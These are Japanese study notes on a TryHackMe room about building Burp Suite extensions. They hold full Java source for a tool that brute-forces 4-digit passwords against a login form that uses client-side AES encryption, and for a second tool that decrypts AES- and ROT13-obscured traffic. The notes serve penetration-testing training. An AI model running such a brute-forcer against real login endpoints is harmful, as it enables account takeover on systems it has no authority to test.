# Burp 拡張

https://tryhackme.com/room/customtoolingviaburp

## 拡張開発１

ログインユーザー名、パスワードをランダムキーで暗号化して送信する Web 画面があるとする。

```js
const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));

const aesKey = await getSecretKey(rawAesKey);

let rawdata =
  "username=" +
  formDataObj["username"] +
  "&password=" +
  formDataObj["password"];

let data = window.btoa(
  String.fromCharCode(
    new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))
  )
);
```

mac はキーを btoa 表現したもの。

```
mac=Vd8uZTbJfJ7LIYRjfpdMBA%3D%3D&data=fgpAuX3zF4weUpPL05wb0BV8AqKWBdXk%2F4qtCc4mqk8%3D
```

### プロジェクトの構成

```
101Burp/
│── src/
│   ├── main/
│   │   ├── java/
│   │   │   ├── BruteForce.java  <-- Main Source Code
│── build.gradle  <-- Contains dependencies
│── settings.gradle
│── gradlew
│── gradlew.bat
```

### コード例

```java
import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class BruteForce implements BurpExtension {
    private MontoyaApi api;
    private static final String FIXED_IV = "0000000000000000";

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("Burp Password Brute-Forcer");
        SwingUtilities.invokeLater(this::createUI);
    }

    private void createUI() {
        JFrame frame = new JFrame("Brute Force Attack");
        frame.setSize(300, 180);
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setLayout(new GridBagLayout());
        frame.setResizable(false);

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        gbc.gridx = 0;
        gbc.gridy = 0;
        frame.add(new JLabel("Username:"), gbc);

        JTextField usernameField = new JTextField("ecorp_user");
        gbc.gridx = 1;
        frame.add(usernameField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 1;
        frame.add(new JLabel("Server URL:"), gbc);

        JTextField urlField = new JTextField("10.10.197.53:8443");
        gbc.gridx = 1;
        frame.add(urlField, gbc);

        JButton startButton = new JButton("Start Attack");
        gbc.gridx = 0;
        gbc.gridy = 2;
        gbc.gridwidth = 2;
        gbc.fill = GridBagConstraints.CENTER;
        frame.add(startButton, gbc);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        startButton.addActionListener((ActionEvent e) -> {
            frame.dispose();
            new Thread(() -> startBruteForce(usernameField.getText().trim(), urlField.getText().trim())).start();
        });
    }

    private void startBruteForce(String username, String serverUrl) {
        if (username.isEmpty() || serverUrl.isEmpty()) {
            api.logging().logToOutput("Invalid input: Username or URL is empty.");
            return;
        }

        api.logging().logToOutput("Starting password brute-force on " + serverUrl + " with username: " + username);

        String[] parts = serverUrl.split(":");
        if (parts.length != 2) {
            api.logging().logToOutput("Error: Invalid server URL format. Use format: 10.10.188.207:8443");
            return;
        }

        String host = parts[0];
        int port;
        try {
            port = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            api.logging().logToOutput("Error: Invalid port number.");
            return;
        }

        HttpService httpService = HttpService.httpService(host, port, true);

        for (int i = 1; i <= 9999; i++) {
            String password = String.format("%04d", i);

            try {
                SecretKey aesKey = generateAESKey();
                String encodedKey = base64EncodeWithPadding(aesKey.getEncoded());

                String rawdata = "username=" + username + "&password=" + password;
                byte[] encryptedData = encryptAES(rawdata, aesKey);
                String encodedData = base64EncodeWithPadding(encryptedData);

                String postBody = "mac=" + URLEncoder.encode(encodedKey, "UTF-8") +
                        "&data=" + URLEncoder.encode(encodedData, "UTF-8");

                HttpRequest request = HttpRequest.httpRequest(httpService, createHttpRequest(postBody, host));
                HttpResponse response = api.http().sendRequest(request).response();

                int statusCode = response.statusCode();
                String responseBody = response.bodyToString();

                api.logging().logToOutput("Password: " + password +
                        " | Status: " + statusCode +
                        " | Response: " + responseBody);

                if (statusCode == 200 && responseBody.contains("result=")) {
                    try {
                        String encryptedBase64 = responseBody.split("=")[1].trim();
                        String base64Decoded = java.net.URLDecoder.decode(encryptedBase64, StandardCharsets.UTF_8);
                        byte[] decodedEncryptedData = Base64.getDecoder().decode(base64Decoded);
                        byte[] decodedKey = Base64.getDecoder().decode(encodedKey);
                        String decryptedResult = decryptAES(decodedKey, decodedEncryptedData);

                        api.logging().logToOutput("Decryption Success: " + decryptedResult);

                        SwingUtilities.invokeLater(() ->
                                JOptionPane.showMessageDialog(null,
                                        "Success! Password is: " + password +
                                                "\nDecrypted Response: " + decryptedResult,
                                        "Brute Force Success",
                                        JOptionPane.INFORMATION_MESSAGE)
                        );

                    } catch (Exception e) {
                        api.logging().logToError("Decryption Failed: " + e.getMessage());
                    }
                    break;
                }

                if (statusCode == 500) {
                    api.logging().logToOutput(" Server returned 500, waiting before retrying...");
                    Thread.sleep(1000);
                }

            } catch (Exception e) {
                api.logging().logToError("Error on password " + password + ": " + e.getMessage());
            }
        }

        api.logging().logToOutput("Brute-force complete!");
    }

    private String decryptAES(byte[] key, byte[] encryptedData) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key, "AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey, iv);
        return new String(cipher.doFinal(encryptedData), StandardCharsets.UTF_8);
    }

    private SecretKey generateAESKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        return keyGen.generateKey();
    }

    private String base64EncodeWithPadding(byte[] data) {
        String encoded = Base64.getEncoder().encodeToString(data);
        while (encoded.length() % 4 != 0) {
            encoded += "=";
        }
        return encoded;
    }

    private byte[] encryptAES(String data, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        cipher.init(Cipher.ENCRYPT_MODE, key, iv);
        return cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
    }

    private String createHttpRequest(String body, String serverUrl) {
        return "POST /login HTTP/1.1\r\n" +
                "Host: " + serverUrl + "\r\n" +
                "Content-Type: application/x-www-form-urlencoded\r\n" +
                "Content-Length: " + body.length() + "\r\n" +
                "\r\n" +
                body;
    }
}
```

### ビルド

```sh
# ビルド。build/libs/ ディレクトリに jar ファイルが生成される。
gradle build
```

### インストール

- Burp の Extensions - Installed タブから Add ボタン押下。
- jar ファイルを選択。
- ロードされたら自動的にダイアログが表示される。

## 拡張開発２

下記のようにリクエストを暗号化しているとする。

```js
function rot13(message) {
  const originalAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
  return message.replace(
    /[a-z]/gi,
    (letter) => cipher[originalAlpha.indexOf(letter)]
  );
}

const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));
const aesKey = await getSecretKey(rawAesKey);

let rawdata =
  "username=" +
  rot13(formDataObj["username"]) +
  "&secret=" +
  rot13(formDataObj["secret"]);
let data = window.btoa(
  String.fromCharCode(
    ...new Uint8Array(await encryptMessage(aesKey, enc.encode(rawdata).buffer))
  )
);

body: "mac=" +
  encodeURIComponent(window.btoa(String.fromCharCode(...rawAesKey))) +
  "&data=" +
  encodeURIComponent(data);
```

### コード例

```java
import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.handler.*;
import burp.api.montoya.logging.Logging;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.persistence.PersistedObject;
import burp.api.montoya.proxy.http.*;
import burp.api.montoya.proxy.http.ProxyRequestHandler;
import burp.api.montoya.proxy.http.ProxyRequestReceivedAction;
import burp.api.montoya.scope.Scope;
import burp.api.montoya.utilities.Base64Utils;
import burp.api.montoya.utilities.URLUtils;
import burp.api.montoya.utilities.Utilities;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpExtender implements BurpExtension, HttpHandler {

    private MontoyaApi api;
    private static final String FIXED_IV = "0000000000000000"; // 16-byte IV
    private Logging logging;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.logging = api.logging();
        api.extension().setName("Burp Decryptor");

        // Register the HTTP request handler
        api.http().registerHttpHandler(this);
        logging.logToOutput("Extension Loaded Successfully");
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        String requestBody = requestToBeSent.body().toString();

        // Extract MAC (AES key) and data (encrypted payload)
        Pattern macPattern = Pattern.compile("mac=([^&]+)");
        Pattern dataPattern = Pattern.compile("data=([^&]+)");

        Matcher macMatcher = macPattern.matcher(requestBody);
        Matcher dataMatcher = dataPattern.matcher(requestBody);

        if (macMatcher.find() && dataMatcher.find()) {
            try {
                byte[] aesKey = Base64.getDecoder().decode(URLDecoder.decode(macMatcher.group(1), StandardCharsets.UTF_8));
                byte[] encryptedData = Base64.getDecoder().decode(URLDecoder.decode(dataMatcher.group(1), StandardCharsets.UTF_8));

                // Decrypt AES-CBC encrypted data
                byte[] decryptedBytes = decryptAES(encryptedData, aesKey);
                String decryptedData = new String(decryptedBytes, StandardCharsets.UTF_8).trim();

                // Apply ROT13 decoding
                String firstPassRot13 = rot13(decryptedData);
                String finalDecryptedData = doubleDecodeParameterNames(firstPassRot13);

                // Log fully decoded request
                logging.logToOutput("\n===== [Decrypted Request] =====");
                logging.logToOutput(finalDecryptedData);
                logging.logToOutput("========================================\n");

            } catch (Exception e) {
                logging.logToError("Request decryption failed: " + e.getMessage());
            }
        }

        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) {
        String responseBody = responseReceived.body().toString();

        // Extract result parameter from response
        Pattern resultPattern = Pattern.compile("result=([^&]+)");
        Matcher resultMatcher = resultPattern.matcher(responseBody);

        if (resultMatcher.find()) {
            try {
                // Decode the AES key from the request for decryption
                String requestBody = responseReceived.initiatingRequest().body().toString();
                Pattern macPattern = Pattern.compile("mac=([^&]+)");
                Matcher macMatcher = macPattern.matcher(requestBody);

                if (!macMatcher.find()) {
                    logging.logToError("Could not retrieve AES key from request.");
                    return ResponseReceivedAction.continueWith(responseReceived);
                }

                byte[] aesKey = Base64.getDecoder().decode(URLDecoder.decode(macMatcher.group(1), StandardCharsets.UTF_8));

                // Decode and decrypt response
                byte[] encryptedResponse = Base64.getDecoder().decode(URLDecoder.decode(resultMatcher.group(1), StandardCharsets.UTF_8));
                byte[] decryptedResponseBytes = decryptAES(encryptedResponse, aesKey);
                String decryptedResponse = new String(decryptedResponseBytes, StandardCharsets.UTF_8).trim();

                // Apply ROT13 decoding
                String finalDecryptedResponse = rot13(decryptedResponse);

                // Log fully decoded response
                logging.logToOutput("\n===== [Decrypted Response] =====");
                logging.logToOutput(finalDecryptedResponse);
                logging.logToOutput("========================================\n");

            } catch (Exception e) {
                logging.logToError("Response decryption failed: " + e.getMessage());
            }
        }

        return ResponseReceivedAction.continueWith(responseReceived);
    }

    private byte[] decryptAES(byte[] encryptedData, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");

        cipher.init(Cipher.DECRYPT_MODE, secretKey, iv);
        return cipher.doFinal(encryptedData);
    }

    private String rot13(String text) {
        StringBuilder result = new StringBuilder();
        for (char c : text.toCharArray()) {
            if (Character.isLetter(c)) {
                if (Character.isUpperCase(c)) {
                    result.append((char) ('A' + (c - 'A' + 13) % 26));
                } else {
                    result.append((char) ('a' + (c - 'a' + 13) % 26));
                }
            } else {
                result.append(c);
            }
        }
        return result.toString();
    }

    private String doubleDecodeParameterNames(String decodedText) {
        StringBuilder finalDecoded = new StringBuilder();
        String[] params = decodedText.split("&");

        for (String param : params) {
            String[] keyValue = param.split("=", 2);
            if (keyValue.length == 2) {
                String doubleDecodedKey = rot13(keyValue[0]);
                finalDecoded.append(doubleDecodedKey).append("=").append(keyValue[1]).append("&");
            } else {
                finalDecoded.append(param).append("&");
            }
        }

        return finalDecoded.length() > 0 ? finalDecoded.substring(0, finalDecoded.length() - 1) : finalDecoded.toString();
    }
}
```
